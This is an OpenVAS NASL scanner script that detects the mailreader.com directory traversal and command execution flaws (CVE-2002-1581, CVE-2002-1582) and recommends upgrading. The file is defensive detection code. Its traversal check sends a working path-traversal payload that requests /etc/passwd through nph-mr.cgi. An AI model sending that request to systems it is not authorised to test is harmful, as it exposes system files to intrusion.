# OpenVAS Vulnerability Test
# $Id: mailreader.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: mailreader.com directory traversal and arbitrary command execution
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "mailreader.com software is installed. A directory traversal flaw 
allows anybody to read arbitrary files on your system.";

tag_solution = "upgrade to v2.3.32 or later";

# References:
# Date: Mon, 28 Oct 2002 17:48:04 +0800
# From: "pokleyzz" <pokleyzz@scan-associates.net>
# To: "bugtraq" <bugtraq@securityfocus.com>, 
#  "Shaharil Abdul Malek" <shaharil@scan-associates.net>, 
#  "sk" <sk@scan-associates.net>, "pokley" <saleh@scan-associates.net>, 
#  "Md Nazri Ahmad" <nazri@ns1.scan-associates.net> 
# Subject: SCAN Associates Advisory : Multiple vurnerabilities on mailreader.com

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11780");
  script_version("$Revision: 9348 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2002-1581", "CVE-2002-1582");
  script_bugtraq_id(5393, 6055, 6058);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("mailreader.com directory traversal and arbitrary command execution");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_banner");
  script_copyright("(C) Michel Arboi 2003");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

dirtrav = 1; version = 1;

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  r2 = NULL;
  if (dirtrav)
  {
    r = http_get(port: port, item: strcat(dir, "/nph-mr.cgi?do=loginhelp&configLanguage=../../../../../../../etc/passwd%00"));
    r2 =  http_keepalive_send_recv(port: port, data: r);
    if (isnull(r2)) exit(0);	# Dead server
    if (r2 =~ "root:[^:]*:0:[01]:")
    {
      security_message(port);
      dirtrav = 0;
    }
  }

  if (version)
  {
    if (r2 !~ "Powered by Mailreader.com v[0-9.]*")
    {
      r = http_get(port: port, item: strcat(dir,  "/nph-mr.cgi?do=loginhelp&configLanguage=english"));
      r2 =  http_keepalive_send_recv(port: port, data: r);
    }
    if (r2 =~ "Powered by Mailreader.com v2\.3\.3[01]")
    {
      m = "You are running a version of mailreader.com software 
which allows any authenticated user to run arbitrary commands
on your system.

*** Note that OpenVAS just checked the version number and did not
*** perform a real attack. So this might be a false alarm.

Solution: upgrade to v2.3.32 or later";
      security_message(port: port, data: m);
      version = 0;
    }
    else if (r2 =~ "Powered by Mailreader.com v2\.([0-1]\.*|2\.([0-2]\..*|3\.([0-9][^0-9]|[12][0-9])))")
    {
# Note: SecurityFocus #5393 advises you to upgrade to 2.3.30, but
# this version contains a terrible flaw! (read above)
      m = "You are running an old version of mailreader.com software 
which allows an attacker to hijack user session.

*** Note that OpenVAS just checked the version number and did not
*** perform a real attack. So this might be a false alarm.

Solution: upgrade to v2.3.32 or later";
      security_message(port: port, data: m);
      version = 0;
    }
  }
  if (! version && ! dirtrav) exit(0);
}

